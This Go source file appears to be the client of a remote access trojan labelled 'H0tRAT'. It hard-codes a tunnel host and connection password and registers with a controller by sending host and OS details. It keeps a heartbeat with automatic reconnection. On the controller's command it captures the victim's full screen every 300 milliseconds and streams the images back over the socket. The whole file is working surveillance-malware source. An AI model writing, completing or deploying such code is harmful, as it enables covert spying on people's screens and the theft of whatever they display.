package client

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/go-vgo/robotgo"

	"image/png"
	"net"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"
	"ylc/src/demo/util"
)

const (
	IP      = "qq80378994.e2.luyouxia.net:28602"
	PORT    = 1010
	CONNPWD = "18Sd9fkdkf9"
)

const (
	HEAD    = "HEAD"
	VERSION = "1.0.0"
)

var isturn = true

var wg sync.WaitGroup

func Ma() {

	connectNew()

}

func heartbeat(conn net.Conn, interval time.Duration) {
	for {
		fmt.Println("连接了==========")
		time.Sleep(interval)
		writer := bufio.NewWriter(conn)
		//创建心跳
		_, err := fmt.Fprintln(writer, -1)
		if err != nil {
			fmt.Println(err)
			//重连
			connectNew()
			return
		}
	}
	wg.Done() // 协程计数器加-1
}

func connectNew() {

	wg.Add(2) // 协程计数器 +1
	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "127.0.0.1:1010")
	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
	if err != nil {
		fmt.Println(err)
	}
	//defer socket.Close()
	// IO流
	dataOutputStream := bufio.NewWriter(socket)

	// 发送信息
	fmt.Fprintln(dataOutputStream, "H0tRAT")
	fmt.Fprintln(dataOutputStream, "USER")
	fmt.Fprintln(dataOutputStream, "HOSTNAME")
	fmt.Fprintln(dataOutputStream, runtime.GOOS)
	fmt.Fprintln(dataOutputStream, IP)
	fmt.Fprintln(dataOutputStream, "测试地址")
	fmt.Fprintln(dataOutputStream, "测试名字")
	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
	fmt.Fprintln(dataOutputStream, "测试")
	fmt.Fprintln(dataOutputStream, VERSION)
	fmt.Fprintln(dataOutputStream, "360")

	dataOutputStream.Flush()
	// // 协程计数器加-1
	go doSomeThing(socket)
	go heartbeat(socket, time.Second)

	wg.Wait() //等待协程计数器为0 退出
	fmt.Println("abc========================")

}
func createScreen(socket net.Conn) {
	// 获取当前屏幕的大小
	screenWidth, screenHeight := robotgo.GetScreenSize()
	util.SendHead(1, socket)
	for {
		time.Sleep(time.Millisecond * 300)
		// 获取当前屏幕的截图
		bitmap := robotgo.CaptureScreen(0, 0, screenWidth, screenHeight)

		// 将截图转换为Image对象
		img := robotgo.ToImage(bitmap)

		// 创建一个PNG文件，并将Image对象保存到文件中
		file, err := os.Create("output.png")
		if err != nil {
			fmt.Println("创建文件失败：", err)
			return
		}
		defer file.Close()

		if err := png.Encode(file, img); err != nil {
			fmt.Println("保存失败：", err)
			return
		}
		fmt.Println("图片保存成功..")
		// 创建一个 bytes.Buffer 对象
		buffer := new(bytes.Buffer)
		// 将截图编码为 PNG 格式并写入 buffer 中

		err = png.Encode(buffer, img)
		if err != nil {
			panic(err)
		}
		//// 将 buffer 转换为 byte 数组
		byteArray := buffer.Bytes()
		fmt.Println(len(byteArray))
		//compress := util.Compress(byteArray)
		//fmt.Println(len(compress))
		util.Send(2, byteArray, socket)
		fmt.Println("发送成功")
	}
}

func doSomeThing(socket net.Conn) {
	for {
		fmt.Println("abc")
		time.Sleep(time.Millisecond)
		reader := bufio.NewReader(socket)
		receiveHead := util.ReceiveHead(reader)

		fmt.Println(receiveHead)
		switch string(receiveHead) {
		//心跳
		case string(0):
			fmt.Println("heart...")

		//屏幕监控
		case string(1):
			go createScreen(socket)
		}
	}
	wg.Done() // 协程计数器加-1

}
